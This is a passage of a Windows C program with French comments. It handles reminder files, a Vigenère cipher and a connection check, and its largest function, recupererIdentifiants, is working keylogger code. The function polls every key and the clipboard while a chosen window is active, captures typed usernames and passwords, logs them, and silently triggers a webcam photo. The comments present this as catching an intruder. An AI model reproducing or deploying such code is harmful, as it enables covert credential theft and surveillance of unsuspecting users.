            else /* Il y'a une ressemblance entre l'heure et la date => RESSEMBLANCE == TRUE */
            {
               if (ACTIVE_MODIFIER_RAPPEL && cpt == lvItemActuel) /* Si on est entrain de modifier un rappel, non pas le cr�e */
               {
                  /* On v�rifie les sujets de rappels */
                  if (buffer[0] == 'T') /* Si 'Toujours' trouv�e dans buffer */
                     j = 15;
                  else
                     j = 17;
                  if (rappel[0] == 'T') /* Si 'Toujours' trouv�e dans rappel */
                     i = 15;
                  else
                     i = 17;
                  //RESSEMBLANCE = TRUE; /* On suppose qu'il y'a une ressemblance de sujet (si on est i�i c'est que RESSEMBLANCE == TRUE) */
                  for (j; j < lstrlen(buffer); j++) /* On compare les sujets des rappels */
                  {
                     if (rappel[i] != buffer[j]) /* S'il y'a une diff�rence */
                     {
                        RESSEMBLANCE = FALSE;
                        break;
                     }
                     i++;
                  }
               }
               if (RESSEMBLANCE)
                  fclose(fichier); /* Fermeture du fichier */
            }
               
            if (RESSEMBLANCE)
            {
               free(buffer);
               return FALSE; /* => Le rappel existe d�j� */
            }
         }
         cpt--;
      }
      free(buffer);
      fclose(fichier);
      
      if (FICHIER_VIDE || !RESSEMBLANCE) /* Si le fichier est vide ou qu'il n'y a aucune ressemblance */
         return TRUE;
   }
   
   return FALSE;
}

//=============================================================================
//          Fonction qui modifie le rappel sp�cifi� si possible
//=============================================================================

BOOL modifierRappel(HANDLE *hListView, char *cheminFichier, int itemPos, char *ancienRappel, char *nvRappel)
{
   FILE *fichier = fopen(cheminFichier, "r");
   BOOL trouver = FALSE;
   
   if (fichier != NULL)
   {
      char *buffer, *buffFinal;
      
      fseek(fichier, 0, SEEK_END); /* On se place � la fin du fichier (pour ftell())*/
      buffFinal = malloc(ftell(fichier)+MAX_SRAPPEL);
      int tailleMax = MAX_SRAPPEL+19; /* + (17) "xx-xx-xxxx xx:xx " + (1) '\n' + (1) */
      buffer = malloc(tailleMax);
      fseek(fichier, 0, SEEK_SET); /* On se place au d�but du fichier */
      lstrcpy(buffFinal, ""); /* Initialisation de buffFinal */
      while (fgets(buffer, tailleMax, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on re�oit pas d'erreur */
      {
         if (lstrcmp(buffer, ancienRappel)) /* Si ce n'est pas la ligne de l'ancien rappel */
            lstrcat(buffFinal, buffer); /* On l'ecrit */
         else
         {
            trouver = TRUE;
            lstrcat(buffFinal, nvRappel); /* On le remplace par le nouveau rappel */
         }
      }
      fclose(fichier);
      fichier = fopen(cheminFichier, "w+"); /* On r�ouvre le fichier et on supprime son ancien contenu */
      fprintf(fichier, "%s", buffFinal);
      free(buffer);
      free(buffFinal);
      fclose(fichier);
      
      if (trouver)
      {
         /* On modifie la listView */
         ajouterALaListView(hListView, nvRappel, lstrlen(nvRappel), TRUE, itemPos);
         return TRUE;
      }
   }
   
   return FALSE;
}

//=============================================================================
//              Fonction qui supprime le rappel sp�cifi�
//=============================================================================

BOOL supprimerRappel(HANDLE *hListView, char *cheminFichier, int itemPos, BOOL jaiUneChaine, char *chaine)
{
   FILE *fichier = fopen(cheminFichier, "r");
   
   if (fichier != NULL)
   {
      char *buffer, *buffFinal, ligne[MAX_SRAPPEL+21]; /* 11 + ' ' + 6 + ' ' + MAX_SRAPPEL+1 + 1 */
      if (jaiUneChaine)
         sprintf(ligne, "%s", chaine);
      else
      {
         char date[11], heure[6], rappel[MAX_SRAPPEL+1];
         /* On r�cup�re la ligne/rappel � supprimer depuis la listView */
         ListView_GetItemText(*hListView, itemPos, 0, date, 11); /* Partie1 (Date) */
         ListView_GetItemText(*hListView, itemPos, 1, heure, 6); /* Partie2 (Heure) */
         ListView_GetItemText(*hListView, itemPos, 2, rappel, MAX_SRAPPEL+1); /* Partie3 (Rappel) */
         sprintf(ligne, "%s %s %s", date, heure, rappel);
      }
      
      fseek(fichier, 0, SEEK_END); /* On se place � la fin du fichier (pour ftell())*/
      buffFinal = malloc(ftell(fichier));
      int tailleMax = MAX_SRAPPEL+19; /* + (17) "xx-xx-xxxx xx:xx " + (1) '\n' + (1) */
      buffer = malloc(tailleMax);
      fseek(fichier, 0, SEEK_SET); /* On se place au d�but du fichier */
      lstrcpy(buffFinal, ""); /* Initialisation de buffFinal */
      while (fgets(buffer, tailleMax, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on re�oit pas d'erreur */
      {
         if (lstrcmp(buffer, ligne)) /* Si ce n'est pas la ligne � supprimer */
            lstrcat(buffFinal, buffer); /* On l'ecrit */
      }
      fclose(fichier);
      fichier = fopen(cheminFichier, "w+"); /* On r�ouvre le fichier et on supprime son ancien contenu */
      fprintf(fichier, "%s", buffFinal);
      free(buffer);
      free(buffFinal);
      fclose(fichier);

      return TRUE;
   }
   else
      return FALSE;
}

//=============================================================================
//   Fonction qui lit le fichier de rappel sp�cifi� et affiche les rappels
//=============================================================================

BOOL lireEtAfficherRappel(HANDLE *hListView, char *cheminFichier)
{
   FILE *fichier = fopen(cheminFichier, "r");
   
   if (fichier != NULL)
   {
      char *buffer;
      int tailleMax = MAX_SRAPPEL+19; /* + (17) "xx-xx-xxxx xx:xx " + (1) '\n' + (1) */
      buffer = malloc(tailleMax);
      while (fgets(buffer, tailleMax, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on re�oit pas d'erreur */
         ajouterALaListView(hListView, buffer, lstrlen(buffer), FALSE, 0);
      free(buffer);
      fclose(fichier);
      return TRUE;  
   }
   else
      return FALSE;
}

//=============================================================================
//                Fonctions de cryptage/d�cryptage vigen�re
//
// @ Le cryptage vigenere est parmi les premiers cryptages apparus, il consiste
//   � combiner une lettre de la phrase avec une autre de la cl� (additioner leur
//   valeurs ASCII) ce qui donnera une nouvelle valeur ASCII
//=============================================================================

short alphabet(char lettre)
{
   if (lettre >= 'a' && lettre <= 'z')
      return 1;
   else if (lettre >= 'A' && lettre <= 'Z')
      return 2;
   else
      return 0;
}

void crypterVigenere(char *phrase, char *cle)
{
   int i, j = 0;

   for (i = 0; i < lstrlen(phrase); i++)
   {
      if (j == lstrlen(cle))
         j = 0;
      
      if (alphabet(phrase[i]) == 1) /* Si lettre minuscule */
      {
         if (alphabet(cle[j]) == 1)
            phrase[i] = (((phrase[i]-'a')+(cle[j]-'a'))%26)+'a';
         else if (alphabet(cle[j]) == 2)
            phrase[i] = (((phrase[i]-'a')+(cle[j]-'A'))%26)+'a';
      }
      else if (alphabet(phrase[i]) == 2) /* Si nn si lettre majuscule */
      {
         if (alphabet(cle[j]) == 1)
            phrase[i] = (((phrase[i]-'A')+(cle[j]-'a'))%26)+'A';
         else if (alphabet(cle[j]) == 2)
            phrase[i] = (((phrase[i]-'A')+(cle[j]-'A'))%26)+'A';
      }
      
      j++;
   }     
}

void decrypterVigenere(char *phrase, char *cle)
{
   int i, j = 0;
   
   for (i = 0; i < lstrlen(phrase); i++)
   {
      if (j == strlen(cle))
         j = 0;
      
      if (alphabet(phrase[i]) == 1) /* Si lettre minuscule */
      {
         if (alphabet(cle[j]) == 1)
            phrase[i] = ((phrase[i]-'a')-(cle[j]-'a'));
         else if (alphabet(cle[j]) == 2)
            phrase[i] = ((phrase[i]-'a')-(cle[j]-'A'));
         
         if (phrase[i] < 0)
            phrase[i] += 26;
            
         if (alphabet(cle[j]) != 0)
            phrase[i] = (phrase[i]%26)+'a';
      }
      else if (alphabet(phrase[i]) == 2) /* Si nn si lettre majuscule */
      {
         if (alphabet(cle[j]) == 1)
            phrase[i] = ((phrase[i]-'A')-(cle[j]-'a'));
         else if (alphabet(cle[j]) == 2)
            phrase[i] = ((phrase[i]-'A')-(cle[j]-'A'));
         
         if (phrase[i] < 0)
            phrase[i] += 26;
            
         if (alphabet(cle[j]) != 0)
            phrase[i] = (phrase[i]%26)+'A';
      }
      
      j++;
   }              
}

//=============================================================================
//                  Fonction qui v�rifie l'etat de la connexion
//=============================================================================

BOOL etatConnexion()
{
   BOOL bConnected;
   DWORD dwFlags;
   bConnected = InternetGetConnectedState(&dwFlags, 0); /* On r�cup�re l'�tat de la connexion */
   return bConnected;
}

//=============================================================================
// Fonction qui r�cup�re les identifiants du voyou (enregistre les touches appuy�s)
//
// @ Si le mot de passe est faut on ne va pas certainement le r�ecup�rer une 2�me
//   fois, il reste donc � g�rer �a
//=============================================================================

void recupererIdentifiants(LPVOID *hRichEdit, char *fenetre)
{
   SHORT keyState;
   int key, historiqueKey[256] = {0}, len;
   BOOL MAJUSCULE = GetKeyState(VK_CAPITAL);
   char log[MAX_TMP], tmp[2], *user, *pass, nomFenetre[MAX_FENETRE_TAILLE];
   user = malloc(50);
   pass = malloc(50); /* :O un mot de passe qui contient 50 caract�res (juste si jamais c vrai :D) */
   lstrcpy(user, ""); /* Initialisation */
   lstrcpy(pass, "");
   BOOL STOP = FALSE, PASSWORD_TURN = FALSE;
   HANDLE hWnd = GetForegroundWindow(), hCurrent = hWnd; /* Handle de la fen�tre de d�part */
   GetWindowText(hCurrent, nomFenetre, MAX_FENETRE_TAILLE); /* Nom de la fen�tre de d�part */
   
   while (!STOP && (hWnd == hCurrent) && rechercherChaineDansChaine(nomFenetre, fenetre))
   {
      Sleep(6); /* On r�duit la vitesse de la boucle */
      
        /* R�cup�ration des touches enfonc�es/saisies */
        for(key = 0; key < 256; key++) 
        {
           keyState = GetAsyncKeyState(key); /* On r�cup�re l'�tat de toutes les touches */
           
           if ((keyState & 0x00000001) && (keyState & 0x8000000)) /* Si une des touches enfonc�e */
           {
               /* Si Click Sourie */
               if (key == 1) /* Sourie gauche */
               {
                  if (PASSWORD_TURN && (lstrlen(pass) >= MINI_LEN_PASS)) /* Si le voyou (:p) a fini de taper son mdp */
                     STOP = TRUE;
                  else if (lstrlen(user) >= MINI_LEN_USER) /* Si nn s'il vien juste de taper son username */
                     PASSWORD_TURN = TRUE;
               }
               /* Si CTRL + 'V' ou 'X' */
               else if((key == 65+'v'-'a' || key == 65+'x'-'a') && ((historiqueKey[17] && historiqueKey[162]) == 1))
               { 
                  if (OpenClipboard(NULL))
                  {
                     HANDLE clip = GetClipboardData(CF_TEXT); /* On r�cup�re le texte du clipboard (espace de stockage appartenant au clavier) */
                     if (!PASSWORD_TURN)
                        lstrcat(user, clip);
                     else
                        lstrcat(pass, clip);
                     CloseClipboard(); /* On ferme le clipboard */
                  }
               }
               /* Si Lettre enfonc�e */
               else if (key >= 65 && key <= 90) 
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activ� */
                  {
                     sprintf(tmp, "%s", &key);
                     if (!PASSWORD_TURN) /* Si on a pas encore taper l'username */
                        lstrcat(user, tmp);
                     else
                        lstrcat(pass, tmp);
                  }
                  else
                  {
                     key += 32;
                     sprintf(tmp, "%s", &key);
                     if (!PASSWORD_TURN)
                        lstrcat(user, tmp);
                     else
                        lstrcat(pass, tmp);
                  }
               }
               /* Si Numeric keypad enfonc� */
               else if(key >= 96 && key <= 105)
               { 
                  sprintf(tmp, "%c", key-96+'0');
                  if (!PASSWORD_TURN)
                     lstrcat(user, tmp);
                  else
                     lstrcat(pass, tmp);
               }
               /* Si Chiffre enfonc� */
               else if (key >= 48 && key <= 57)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activ� */
                  {
                     sprintf(tmp, "%c", key);
                     if (!PASSWORD_TURN)
                        lstrcat(user, tmp);
                     else
                        lstrcat(pass, tmp);
                  }
                  else if (((historiqueKey[17] && historiqueKey[18]) && (historiqueKey[162] && (historiqueKey[164] || historiqueKey[165]))) == 1) /* Si CTRL + ALT ou ALT GR activ� */
                  {
                     if (key == 48)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "@");
                        else
                           lstrcat(pass, "@");
                     }
                     else if (key == 51)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "#");
                        else
                           lstrcat(pass, "#");
                     }
                  }
                  else
                  {
                     if (key == 48)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                     else if (key == 49)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "&");
                        else
                           lstrcat(pass, "&");
                     }
                     else if (key == 50)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                     else if (key == 54)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "-");
                        else
                           lstrcat(pass, "-");
                     }
                     else if (key == 55)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                     else if (key == 56)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "_");
                        else
                           lstrcat(pass, "_");
                     }
                     else if (key == 57)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                  }
               }
               /* Si MAJUSCULE enfonc�e (activ�/d�sactiv�) */
               else if (key == 20) MAJUSCULE = !MAJUSCULE;
               /* Si les Caract�res qui restent enfonc�s */
               else if(key == 190)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activ� */
                  {
                     if (!PASSWORD_TURN)
                        lstrcat(user, ".");
                     else
                        lstrcat(pass, ".");
                  }
               }
               else if (key == 110)
               {
                  if ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 0) /* Si SHIFT d�sactiv� */
                  {
                     if (!PASSWORD_TURN)
                        lstrcat(user, ".");
                     else
                        lstrcat(pass, ".");
                  }
               }
               else if (key == 106)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "*");
                  else
                     lstrcat(pass, "*");
               }
               else if (key == 107)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "+");
                  else
                     lstrcat(pass, "+");
               }
               else if (key == 109)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "-");
                  else
                     lstrcat(pass, "-");
               }
               else if (key == 111)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "/");
                  else
                     lstrcat(pass, "/");
               }
               else if (key == 222)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "�");
                  else
                     lstrcat(pass, "�");
               }
               /* Si Caract�res Sp�ciaux enfonc� */
                  /* Si touche BACKSPACE (effac�) */
                  else if (key == 8)
                  {
                     if (!PASSWORD_TURN)
                     {
                        if (len = lstrlen(user))
                           user[len-1] = '\0'; /* On supprime le dernier caract�re de user */
                     }
                     else
                     {
                        if (len = lstrlen(pass))
                           pass[len-1] = '\0'; /* On supprime le dernier caract�re de pass */
                     }
                  }
                  /* Si touche TAB */
                  else if (key == 9)
                  {
                     if (lstrlen(user) >= MINI_LEN_USER) /* S'il vien juste de taper son username */
                        PASSWORD_TURN = TRUE;
                  }
                  /* Si touche ENTER (entr�) */
                  else if (key == 13)
                  {
                     if (PASSWORD_TURN && (lstrlen(pass) >= MINI_LEN_PASS)) /* Si le voyou a fini de taper son mdp */
                        STOP = TRUE;
                  }
                  /* Si touche ESPACE */
                  else if (key == 32)
                  {
                     if (!PASSWORD_TURN)
                        lstrcat(user, " ");
                     else
                        lstrcat(pass, " ");
                  }
               
               /* Sauvegarde de la touche actuelle */
               historiqueKey[key] = 1;
               
           } // Sortie du 1er if
           
           /* Raffraichissement de l'historique des touches */
           if(historiqueKey[key] == 1 && !GetAsyncKeyState(key)) /* Si la touche n'est plus enfonc�e */
              historiqueKey[key] = 0;
            
        } // Sortie du For
        
        hCurrent = GetForegroundWindow(); /* Handle de la fen�tre actuelle */
        GetWindowText(hCurrent, nomFenetre, MAX_FENETRE_TAILLE); /* Nom de la fen�tre actuelle */
        
   } // Sortie du While()
   
   if (STOP && !verifierWhiteListe(user)) /* Si on est sorti de la boucle normalement et que l'username n'existe pas dans la White Liste */
   {
      SYSTEMTIME Time;
      GetSystemTime(&Time); /* On r�cup�re le temp */
      sprintf(log, "=> %02d:%02d : [%s] <User> : %s <Pass> : %s\n", Time.wHour, Time.wMinute, fenetre, user, pass);
      enregistrerEtLireLog(log, hRichEdit, FICHIER_LOG, TRUE, FALSE, TRUE); /* On enregistre tout dans le fichier Log */
      sprintf(log, "WebCamImageSave /capture /LabelColor ff0000 /FontBold 1 /FontSize 16 /FontName Arial /Filename %s\\%s_%02d-%02d-%02d-%d.jpg", dossier, user, Time.wHour, Time.wMinute, Time.wSecond, Time.wMilliseconds);
      callProgram(WEBCAM_EXE, log); /* On prend une photo � l'aide de la webcam (elle doit �tre activ� pour que �a marche) */
   }
   
   free(user);
   free(pass);
}

//=============================================================================
//   Fonction qui v�rifie si la chaine sp�cifi�e existe dans la white liste
//=============================================================================

BOOL verifierWhiteListe(char *chaine)
{
   FILE *fichier = fopen(WHITE_LISTE, "r");
   
   if (fichier != NULL)
   {
      char *buffer;
      int tailleMax = 50, len;
      buffer = malloc(tailleMax);
      while (fgets(buffer, tailleMax, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on re�oit pas d'erreur */
      {
         len = lstrlen(buffer)-1;
         if (buffer[len] == '\n')
            buffer[len] = '\0'; /* On enl�ve '\n' de buffer */
         if (!lstrcmp(buffer, chaine)) /* Si la chaine existe */
            return TRUE;
      }
      free(buffer);
      fclose(fichier);
   }
   
   return FALSE;
}

//=============================================================================
//          Fonction qui recherche une chaine dans une autre
//
// @ retourne TRUE si trouv�
// @ retourne FALSE si pas trouv�
// @ Cette fonction est beaucoup plus mieu que strstr() qui ne fontionne pas
//   parfois
//=============================================================================

BOOL rechercherChaineDansChaine(char *chaine1, char *chaine2)
{
   /* R�cup�ration des longueurs des chaines */
   unsigned int chaine1_taille = lstrlen(chaine1);
   unsigned int chaine2_taille = lstrlen(chaine2);
   int i, j, save;
   
   for (i = 0; i < chaine1_taille; i++) /* Recherche de chaine2 dans chaine1 */
   {
      if (chaine1[i] == chaine2[0]) /* Si premier caract�re de chaine2 trouv� */
      {
         if (chaine2_taille == 1) /* Si le texte recherch� a d�j� �t� trouv� (vu qu'il ne contient qu'un seul caract�re) */
            return TRUE; /* trouv� */
         save = i;
         for (j = 1; j < chaine2_taille && i < chaine1_taille-1; j++) /* On cherche les autres caract�res */
         {
            i++;
            if (chaine2[j] != chaine1[i]) /* Si caract�re diff�rent (ce n'est pas le texte recherch�) */
            {
               i = save;
               break;                        
            }
            else if (j == chaine2_taille-1)
               return TRUE; /* trouv� */
         } // FIN 2EME FOR
      } // FIN IF
   } // FIN 1ER FOR
   
   return FALSE; /* pas trouv� */
}

//=============================================================================
//  Fonction qui calcule la diff�rence de temp (entre heures, minutes donn�es)
//=============================================================================

int differenceDeTemp(int hrC, int minC, int hrP, int minP)
{
   if (hrC == hrP) /* Si �galit� d'heures, on calcul la diff�rence entre les minutes */
      return minC-minP;
   else if (hrC > hrP) /* Si l'heure actuelle > l'heure pr�c�dente */
      return ((hrC-hrP-1)*60)+(60-minP)+minC;
   else /* Si l'heure actuelle < l'heure pr�c�dente */
      return ((23-(hrP-hrC))*60)+(60-minP)+minC;
}
